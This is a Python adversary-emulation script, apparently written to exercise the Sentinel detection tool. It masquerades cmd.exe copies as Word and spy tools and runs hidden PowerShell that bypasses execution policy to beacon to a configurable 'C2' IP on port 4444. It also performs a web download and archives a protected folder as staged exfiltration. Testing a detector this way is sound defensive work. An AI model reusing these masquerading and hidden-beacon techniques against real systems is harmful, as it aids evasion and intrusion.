"""NEMESIS: Sentinel icin saldiri simulatoru.

YALNIZCA kendi bilgisayarinizda, Sentinel'in tespitlerini gostermek icin kullanin.
Senaryolar zararsizdir: sistem araclarinin kopyalari kisa sure bekleyip kapanir,
dis baglanti denemeleri belgeleme amacli (TEST-NET) bir adrese yapilir.

Kullanim:
    python simulator/nemesis.py                 # Grafik arayuz
    python simulator/nemesis.py --senaryo LOCAL # Tek senaryoyu arayuzsuz calistir
    python simulator/nemesis.py --liste         # Senaryolari listele
"""
import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import threading

# ==========================================
# KONFİGÜRASYON
# ==========================================
# C2 sunucusu: kendi laboratuvarinizdaki saldiri makinesinin IP'si (or. Kali).
# Varsayilan 192.0.2.10 belgeleme amacli bir adrestir, gercek bir yere baglanmaz.
KALI_IP = os.environ.get("NEMESIS_C2_IP", "192.0.2.10")
HEDEF_IP = "127.0.0.1"
SIM_DIR = os.path.dirname(os.path.abspath(__file__))
HEDEF_PROJE = os.path.dirname(SIM_DIR)  # Sentinel'in korudugu proje klasoru
TEST_CIKTISI = os.path.join(tempfile.gettempdir(), "sentinel_lotl_test.txt")
SIZINTI_ZIP = os.path.join(tempfile.gettempdir(), "sentinel_exfil_test.zip")
SYSTEM32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")

# Maskeleme senaryolari icin cmd.exe kopyalari
CASUS_EXE = os.path.join(SIM_DIR, "siber_casus.exe")
HIRSIZ_EXE = os.path.join(SIM_DIR, "veri_hirsizi.exe")
WORD_EXE = os.path.join(SIM_DIR, "winword.exe")

CREATE_NEW_CONSOLE = 0x00000010

SENARYOLAR = {
    "NMAP": ("1. AĞ TARAMASI (Honeypot Teması)", "#00FFFF"),
    "TRUVA": ("2. TRUVA ATI (C2 Sızması)", "#00FF00"),
    "MAKRO": ("3. OLTALAMA (Zararlı Word Makrosu)", "#FF00FF"),
    "FILELESS": ("4. DOSYASIZ İNDİRME (Living off the Land)", "#00BFFF"),
    "LOCAL": ("5. LOKAL İHLAL (Casus Sızması)", "#FF8C00"),
    "DRIPPING": ("6. VERİ PAKETLEME (Zipleme Sızıntısı)", "#FFD700"),
    "EXFIL": ("7. GİZLİ VERİ SIZDIRMA (Compress-Archive)", "#FF4500"),
}


def araclari_hazirla():
    cmd_path = os.path.join(SYSTEM32, "cmd.exe")
    for hedef in (CASUS_EXE, HIRSIZ_EXE, WORD_EXE):
        if not os.path.exists(hedef):
            shutil.copy2(cmd_path, hedef)


def _honeypot_temasi():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        s.connect_ex((HEDEF_IP, 9999))


def _konsol(exe, baslik, renk, satirlar, sure=15):
    """Gorsel bir 'korsan terminali' acar (maskelenmis cmd kopyasi)."""
    echo = " & ".join(f"echo {s}" for s in satirlar)
    cmd = f'"{exe}" /c "color {renk} & title {baslik} & {echo} & ping 127.0.0.1 -n {sure} > nul"'
    return subprocess.Popen(cmd, creationflags=CREATE_NEW_CONSOLE)


def senaryo_baslat(ad, arka_planda=True):
    """Senaryoyu baslatir ve olusturulan sureci (varsa) dondurur."""
    araclari_hazirla()

    if ad == "NMAP":
        if arka_planda:  # Arayuz donmasin
            threading.Thread(target=_honeypot_temasi, daemon=True).start()
        else:
            _honeypot_temasi()
        return None

    if ad == "TRUVA":
        ps = (f"$c = New-Object System.Net.Sockets.TcpClient; "
              f"try {{ $c.ConnectAsync('{KALI_IP}', 4444) | Out-Null }} catch {{}}; Start-Sleep -s 12; $c.Close()")
        return subprocess.Popen(["powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                                 "-Command", ps])

    if ad == "MAKRO":
        # Maskelenmis "winword.exe" (cmd kopyasi) gizli PowerShell baslatir
        return subprocess.Popen(f'"{WORD_EXE}" /c "powershell.exe -WindowStyle Hidden -Command Start-Sleep -s 12"',
                                cwd=SIM_DIR)

    if ad == "FILELESS":
        ps = f"Invoke-WebRequest -Uri http://example.com -OutFile '{TEST_CIKTISI}'; Start-Sleep -s 12"
        return subprocess.Popen(["powershell.exe", "-WindowStyle", "Hidden", "-Command", ps])

    if ad == "LOCAL":
        return _konsol(CASUS_EXE, "SIBER CASUS - SIZMA BASARILI", "4c",
                       ["[!] SISTEME SIZILDI.", f"[^>] Hedeflenen Dizin: {HEDEF_PROJE}",
                        "[*] Kritik Sifreler Cekiliyor... Lutfen Bekleyin."])

    if ad == "DRIPPING":
        return _konsol(HIRSIZ_EXE, "VERI HIRSIZI - PAKETLEME", "60",
                       ["[!] VERI SIZINTISI BASLADI.", f"[^>] Kaynak Merkez: {HEDEF_PROJE}",
                        "[*] Tum projeler arsivleniyor (Dripping)..."])

    if ad == "EXFIL":
        # Gizli PowerShell (SUSPICIOUS_PROCESS) + korunan dizinin arsivlenmesi (DATA_EXFILTRATION)
        # -> 'golge mudahale': surec sessizce oldurulmeli. Zip sonunda silinir.
        kaynak = os.path.join(HEDEF_PROJE, "sentinel")
        ps = (f"Compress-Archive -Path '{kaynak}' -DestinationPath '{SIZINTI_ZIP}' -Force; "
              f"Start-Sleep -s 12; Remove-Item '{SIZINTI_ZIP}' -ErrorAction SilentlyContinue")
        return subprocess.Popen(["powershell.exe", "-WindowStyle", "Hidden", "-Command", ps])

    raise ValueError(f"Bilinmeyen senaryo: {ad}")


def arayuz():
    import tkinter as tk

    root = tk.Tk()
    root.title("NEMESIS | Saldiri Arayuzu")
    root.geometry("600x600")
    root.configure(bg="#050505")

    tk.Label(root, text="☠️ NEMESIS SALDIRI AĞI ☠️", font=("Courier", 18, "bold"),
             bg="#050505", fg="#FF003C").pack(pady=15)
    durum = tk.Label(root, text="[*] DURUM: Hedef Bekleniyor...", font=("Courier", 11), bg="#050505", fg="#FF003C")

    def calistir(ad, baslik, renk):
        try:
            senaryo_baslat(ad)
            durum.config(text=f"[+] DURUM: {baslik} devrede...", fg=renk)
        except Exception as e:
            durum.config(text=f"[!] HATA: {e}", fg="#FF003C")
        root.after(4000, lambda: durum.config(text="[*] DURUM: Hedef Bekleniyor...", fg="#FF003C"))

    for ad, (baslik, renk) in SENARYOLAR.items():
        tk.Button(root, text=baslik, font=("Consolas", 11, "bold"), bg="#1a0000", fg=renk,
                  activebackground=renk, width=50,
                  command=lambda a=ad, b=baslik, r=renk: calistir(a, b, r)).pack(pady=6)
    durum.pack(pady=20)
    root.mainloop()


def main():
    parser = argparse.ArgumentParser(description="NEMESIS saldiri simulatoru (yalnizca kendi makinenizde)")
    parser.add_argument("--senaryo", choices=list(SENARYOLAR), help="Arayuz acmadan tek senaryo calistir")
    parser.add_argument("--liste", action="store_true", help="Senaryolari listele")
    args = parser.parse_args()

    if args.liste:
        for ad, (baslik, _) in SENARYOLAR.items():
            print(f"{ad:<9} {baslik}")
    elif args.senaryo:
        p = senaryo_baslat(args.senaryo, arka_planda=False)
        print(f"[+] {args.senaryo} baslatildi" + (f" (PID {p.pid})" if p else ""))
    else:
        arayuz()


if __name__ == "__main__":
    main()
